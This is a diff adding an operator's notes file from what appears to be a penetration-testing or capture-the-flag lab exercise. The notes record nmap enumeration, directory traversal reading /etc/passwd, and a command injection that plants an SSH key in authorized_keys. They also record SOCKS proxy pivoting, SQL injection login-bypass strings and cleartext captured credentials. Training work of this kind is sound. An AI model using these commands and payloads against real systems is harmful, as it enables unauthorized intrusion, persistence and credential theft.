@@ -1,0 +1,176 @@
+----------
+
+OP NOTES
+
+TARGET IP: 10.50.31.195
+
+IGNORE: 10.0.X.X, 10.10.X.X, X.X.X.30, X.X.X.190
+
+
+nmap -v -sT -Pn -T4 -sV 10.50.31.195
+- 22 (ssh)
+- 80 (http)
+
+POTENTIAL SERVICE ENUMERATION
+
+nmap -v -sT -Pn -T4 -sV 10.50.31.195 --script=http-enum -p80
+- /robots.txt
+- /images/
+- /share/
+
+VISUAL SITE INPECTION
+
+Turkish flag?
+
+No Links
+
+HTTP-ENUM
+
+/images
+has potentially interesting map
+
+/robots.txt
+User-agent: *
+Disallow: /Onlinetools
+
+/share
+another potentially interesting map
+contains flag
+
+
+ROBOTS.TXT
+/Onlinetools
+/Onlinetools/tools.php
+
+Cant command inject, dir traversal
+
+/etc/passwd
+
+root /bin/bash
+ubuntu /bin/bash
+openupthedoor /bin/bash
+
+
+stories to read contained flag
+
+CAN COMMAND INJECT, only in bottom field
+
+; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLRORu0A2dh+mfncryAwvgMjXU91cpBtNDXo9uLrvvcn8B4QZlB5cG1nOqw18usJWEXMUsN7XeLqC1f20duLNgyiwIqPU9pPKKDpmYUt6U65JxkXS6Dv98/flvLgup1Sog9qRx+lWE2yt+tWwegQuSCx8WgCKmqzGhqTyCxh3IlzL8ujjsDEXu7zaekZ3bZo8XkvBSc3DNPplzESYyrIewH+BdD2FwIY3+d+0QwsVEdDnewbECZHKR8Z9tHa+3GUVuUaJyZDUAXy0PnwfRDou89EdosLOfMF6/FsHjmPAkqePxkmwLUoDWdx71AT8ls/783w/5Gz7Pi9HRUCzQFpMH student@lin-ops" > /var/www/.ssh/authorized_keys
+
+ssh onto box
+
+ministry-defense-12
+
+no unsual ports seem to be open
+ran ping sweep
+
+found automation script that open port 8050
+in script:
+	username: openupthedoor
+	password: B12c3b34f
+
+also:
+	login: thisaintit
+	password:
+	
+ssh -MS /tmp/red www-data@10.50.31.195
+ssh -S /tmp/red red -O forward -D9050
+
+proxychains nmap 192.168.28.177,182 -v -sT -Pn -T4 -sV
+
+192.168.28.177:
+- 22 (ssh)             9000
+- 21254 (?)		9004
+
+192.168.28.182:
+- 22 (ssh)             9001
+- 80 (http)            9002
+
+proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.182 --script=http-enum
+
+/login/
+- /loginin.html
+- /login.php
+
+/robots.txt
+- /Onlinetools
+-   /lookup.php
+	DIR TRAVERSAL
+	/etc/passwd:
+		root /bin/bash
+		ubuntu /bin/bash
+	/etc/hosts:
+		contains flag
+
+
+- /login/
+
+/images/
+- armylogo.png
+
+loginin.html
+- admin
+- ' OR '1'='1
+
+~
+  [name] => Msmith
+  [password] => Squanchy
+  
+  [name] => Fpalic
+  [password] => Birdperson
+  
+  [name] => Kmichae
+  [password] => MrMeeseeks
+~
+
+admin
+' OR '1'='1' UNION SELECT 1 ; #
+
+
+
+
+||||||||||||||||||||||||||||||||||||||||||||||||
+
+ part 2
+
+
+
+
+
+
+192.168.28.5 
+22                 9005
+135
+139
+445
+3389               9006
+9999
+
+ps1 file in registry
+
+service with no description
+replaced file with move up
+
+
+192.168.28.10
+22                 9007
+
+buffer overflow "exploit_this"
+
+192.168.28.19
+22                 9008
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
